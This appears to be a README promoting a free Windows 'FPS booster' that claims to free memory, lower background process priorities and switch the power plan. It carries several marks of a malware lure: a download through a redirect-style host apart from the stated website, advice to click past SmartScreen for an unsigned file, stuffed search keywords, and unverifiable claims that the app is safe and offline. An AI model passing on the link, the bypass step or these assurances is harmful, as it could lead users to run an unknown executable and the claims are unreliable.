# Game FPS Booster - free pre-game FPS boost for Windows that closes background bloat and lifts process priority

Game FPS Booster is a tiny Windows utility built for the sixty seconds before you tap "Play." It sweeps background bloat out of RAM, drops noisy processes to a lower priority, and flips the power plan to High Performance so your CPU stops downclocking between frames. It runs on Windows 10 and Windows 11, is completely free, needs no account, and ships with no watermark - a sober, honest alternative to the usual nox booster game booster junk cleaner antivirus bundles that promise the world and then quietly install three toolbars.

## Download

Download for Windows: https://go.download-helper.tech/go/FPSB

The build arrives as a small ZIP. Unzip it into any folder you like - Desktop, a games drive, a USB stick - then double-click the app inside. Nothing is written to Program Files, nothing is registered, and uninstalling is a matter of deleting the folder. SmartScreen may show a first-run warning because the file is not code-signed; pick **More info -> Run anyway** and it will remember you from then on.

## What it does

- **One-click Boost pass** - a single button triggers all three optimizations in sequence, no menus to hunt through.
- **Working-set trimming** - unused memory pages belonging to background processes are handed back to Windows via `EmptyWorkingSet`, freeing room for the game.
- **Priority throttling** - chatty background apps are quietly dropped to `BELOW_NORMAL_PRIORITY_CLASS` so your foreground game keeps the CPU to itself.
- **High Performance power plan** - the active scheme is switched through `PowerSetActiveScheme`, stopping the CPU from downclocking during idle microseconds between frames.
- **Anti-cheat safe list** - EasyAntiCheat, BattlEye, Vanguard, FACEIT, PunkBuster, GameGuard, and XignCode are skipped so nothing competitive gets flagged.
- **Foreground window protected** - whichever app is currently in focus is never touched, so your game or launcher is untouched by the sweep.
- **Live counters** - after each pass you see exactly how many megabytes were freed and how many processes were quieted.
- **Circular memory gauge and tray indicator** - watch RAM load in real time, both inside the window and down in the system tray.
- **Automatic watcher mode** - optionally let the app run a Boost on its own once RAM load crosses a threshold you pick (default 80%).
- **Fully reversible** - closing the app or toggling off the watcher returns priorities and the power plan to their original state. No registry edits linger.

## Quick start

1. Download the ZIP, unzip it, and drop the folder somewhere permanent.
2. Double-click the app to open it. Approve the SmartScreen prompt the first time.
3. With your game launcher open but the game not yet started, click the big **Boost** button and watch the freed-memory number tick up.
4. Launch your game. The circular gauge keeps running in the tray so you can glance at RAM load mid-session.
5. Optional: enable the background watcher and set a RAM threshold so future Boost passes happen without you touching the window.

## FAQ

**Is it free?** Yes, free forever. No trials, no "pro" tier, no upsells.

**Does it work on Windows 11?** Yes, Windows 10 and Windows 11 (64-bit) are both supported, same build.

**Do I need an account or a login?** No. There is no sign-up, no cloud sync, nothing to register.

**Does it need internet?** No. Once you have the ZIP, the app runs fully offline. It never phones home.

**Does it need admin rights?** No. Working-set trimming, priority changes, and the power-plan switch all work from a standard user context.

**Is it safe for ranked games?** Yes - the denylist of anti-cheat and DRM services means those processes are never throttled, so your account stays clean.

**What happens when I close it?** All changes are undone. Priorities return to normal, the power plan reverts, and freed memory refills on its own as apps need it.

## Website

Website: https://gamefpsboosterpc.com

## System requirements

- Windows 10 or Windows 11, 64-bit
- .NET Framework 4.8 (preinstalled on Windows 10 and 11)

## License

Distributed under the MIT License. See `LICENSE` for details.
